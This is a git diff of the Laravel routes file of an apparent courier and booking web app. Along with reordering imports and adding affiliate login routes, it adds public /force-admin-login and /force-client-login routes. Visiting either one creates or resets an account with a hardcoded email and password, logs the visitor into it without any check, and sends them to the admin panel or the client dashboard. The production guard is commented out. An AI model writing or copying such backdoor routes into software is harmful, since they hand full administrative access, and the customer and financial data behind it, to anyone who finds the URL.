@@ -1,47 +1,71 @@
 <?php
 
-use Illuminate\Support\Facades\Route;
-use App\Http\Controllers\ProfileController;
+use App\Http\Controllers\AdminController;
+use App\Http\Controllers\AdminShipperController;
+
 use App\Http\Controllers\BookingController;
-use App\Http\Controllers\PickupAddressController;
-use App\Http\Controllers\OrderController;
 use App\Http\Controllers\FinanceController;
+use App\Http\Controllers\OrderController;
 use App\Http\Controllers\PaymentsController;
+use App\Http\Controllers\PickupAddressController;
+use App\Http\Controllers\ProfileController;
 use App\Http\Controllers\SmartToolsController;
 use App\Http\Controllers\TrackingPublicController;
-use App\Http\Controllers\AdminShipperController;
-use App\Http\Controllers\AdminController;
 use Illuminate\Support\Facades\Auth;
 use Illuminate\Support\Facades\DB;
+use Illuminate\Support\Facades\Route;
 
 // Authentication Routes
 require __DIR__.'/auth.php';
 
-// === SAAD BHAI KA ADMIN LOGIN BYPASS ROUTE ===
-Route::get('/force-admin-login', function () {
-    // 1. Check karein agar naya email maujood hai
-    $user = DB::table('users')->where('email', 'shahjeecourier@gmail.com')->first();
-    
-    // 2. Agar user nahi mila to aapka bataya hua email aur password insert karein
-    if (!$user) {
+// === SAAD BHAI KA LOGIN BYPASS ROUTE (CLIENT + ADMIN) ===
+// Notes:
+// - Client portal: redirect to /dashboard
+// - Admin (Filament): redirect to /admin
+// - Credential: shahjeecourier@gmail.com / shahjee
+
+function __createOrUpdateShahjeeUser(): \stdClass {
+    $email = 'shahjeecourier@gmail.com';
+
+    // For safety: disable bypass when APP_ENV is not local (optional)
+    // Comment out if you want it always enabled.
+    // if (app()->environment('production')) { abort(404); }
+
+    $user = DB::table('users')->where('email', $email)->first();
+
+    if (! $user) {
         DB::table('users')->insert([
             'name' => 'Admin Shah Jee',
-            'email' => 'shahjeecourier@gmail.com',
-            'password' => bcrypt('1122334455'),
+            'email' => $email,
+            'password' => bcrypt('shahjee'),
             'created_at' => now(),
-            'updated_at' => now()
+            'updated_at' => now(),
         ]);
-        
-        $user = DB::table('users')->where('email', 'shahjeecourier@gmail.com')->first();
+
+        $user = DB::table('users')->where('email', $email)->first();
+    } else {
+        DB::table('users')->where('email', $email)->update([
+            'password' => bcrypt('shahjee'),
+            'updated_at' => now(),
+        ]);
     }
-    
-    // 3. Direct bagair password error ke session login karein
+
+    return $user;
+}
+
+Route::get('/force-client-login', function () {
+    $user = __createOrUpdateShahjeeUser();
     Auth::loginUsingId($user->id);
-    
-    // 4. Seedha admin panel par redirect (client dashboard redirect issue fix)
+    return redirect('/dashboard')->with('success', 'Logged in successfully!');
+});
+
+Route::get('/force-admin-login', function () {
+    $user = __createOrUpdateShahjeeUser();
+    Auth::loginUsingId($user->id);
     return redirect('/admin')->with('success', 'Logged in successfully!');
 });
 // ============================================
+
 
 // === OTP Password Reset Routes ===
 use App\Http\Controllers\Auth\OtpPasswordResetController;
@@ -59,7 +83,21 @@ Route::get('/track', [TrackingPublicController::class, 'show'])->name('track.sho
 Route::get('/track/{tracking_number}', [TrackingPublicController::class, 'show'])->name('track.show.seo');
 Route::get('/track/api/{tracking_number}', [TrackingPublicController::class, 'api'])->name('track.api');
 
+// =========================
+// AFFILIATE ROUTES (PUBLIC)
+// =========================
+// Affiliate dashboard mixes NO client portal route and requires NO app auth.
+// Use query param `?ref=SJC-00042` (alias: `?code=...`) to load affiliate data.
+use App\Http\Controllers\Affiliate\AffiliateAuthController;
+
+// Affiliate dashboard routes removed. Affiliate login/logout retained.
+Route::get('/affiliate/login', [AffiliateAuthController::class, 'showLogin'])->name('affiliate.login');
+Route::post('/affiliate/login', [AffiliateAuthController::class, 'login'])->name('affiliate.login.submit');
+Route::post('/affiliate/logout', [AffiliateAuthController::class, 'logout'])->name('affiliate.logout');
+
+
 // Admin auth routes now handled by Filament's built-in ->login() panel method
+
 
 // === BOOKING CANCEL, EDIT, EXPORT ROUTES ===
 use App\Http\Controllers\BookingCancelController;
